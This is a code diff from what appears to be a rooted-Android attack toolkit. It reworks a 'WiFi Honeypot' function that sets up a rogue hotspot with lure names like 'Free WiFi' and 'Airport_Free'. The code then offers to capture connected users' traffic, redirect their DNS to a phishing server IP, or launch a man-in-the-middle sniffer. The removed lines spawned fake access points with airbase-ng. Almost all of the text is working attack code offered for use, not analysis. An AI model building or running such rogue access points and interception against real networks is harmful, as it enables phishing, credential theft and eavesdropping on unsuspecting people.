@@ -298,33 +298,45 @@ def create_multiple_aps(interface):
     try:
         print(f"{Fore.GREEN}[+] Starting WiFi Honeypot...{Fore.RESET}")
         
-        # Use full paths for Termux binaries
-        TERMUX_PATH = "/data/data/com.termux/files/usr/bin/"
-        
-        # Setup monitor mode manually
-        os.system(f"su -c '{TERMUX_PATH}airmon-ng check kill'")
-        os.system(f"su -c '{TERMUX_PATH}airmon-ng start {interface}'")
-        
         # Common network names
         ssid_list = ["Free WiFi", "Guest Network", "Public WiFi", "Coffee Shop", "Airport_Free"]
         
-        # Create multiple APs using airbase-ng
-        for i, ssid in enumerate(ssid_list):
-            channel = random.randint(1, 11)
-            os.system(f"su -c '{TERMUX_PATH}airbase-ng -e \"{ssid}\" -c {channel} {interface} &'")
-            print(f"{Fore.GREEN}[+] Created AP: {ssid} on channel {channel}{Fore.RESET}")
-            time.sleep(1)
+        print(f"\n{Fore.YELLOW}Select action when device connects:")
+        print(f"1. Monitor traffic")
+        print(f"2. DNS redirect")
+        print(f"3. MITM attack")
+        print(f"4. Just monitor{Fore.RESET}")
         
-        print(f"\n{Fore.GREEN}[+] All APs created! Monitoring for connections...{Fore.RESET}")
+        action = input(f"\n{Fore.CYAN}Choose action: {Fore.RESET}")
         
-        # Monitor for connections
+        # Use Android's WifiManager
+        os.system("su -c 'cmd wifi set-wifi-enabled true'")
+        
+        # Create AP using Android's native hotspot
+        os.system("su -c 'settings put global wifi_hotspot_enabled 1'")
+        
+        # Setup network monitoring
+        os.system("su -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'")
+        os.system("su -c 'iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE'")
+        
+        print(f"{Fore.GREEN}[+] Hotspot created! Monitoring connections...{Fore.RESET}")
+        
         while True:
-            os.system(f"su -c '{TERMUX_PATH}airodump-ng {interface}'")
+            if action == "1":
+                os.system("su -c 'tcpdump -i wlan0 -w capture.pcap'")
+            elif action == "2":
+                fake_ip = input(f"{Fore.CYAN}Enter phishing server IP: {Fore.RESET}")
+                dns_spoof("192.168.43.2", fake_ip)  # Android default hotspot subnet
+            elif action == "3":
+                mitm_sniffer("wlan0")
+            else:
+                os.system("su -c 'tcpdump -i wlan0'")
             
     except KeyboardInterrupt:
         print(f"\n{Fore.YELLOW}[*] Cleaning up...{Fore.RESET}")
-        os.system(f"su -c 'killall airbase-ng'")
-        os.system(f"su -c '{TERMUX_PATH}airmon-ng stop {interface}'")
+        os.system("su -c 'settings put global wifi_hotspot_enabled 0'")
+        os.system("su -c 'iptables -F'")
+        os.system("su -c 'iptables -t nat -F'")
 
 def bluetooth_attacks():
     if not os.path.exists("/system/xbin/su") and not os.path.exists("/system/bin/su"):
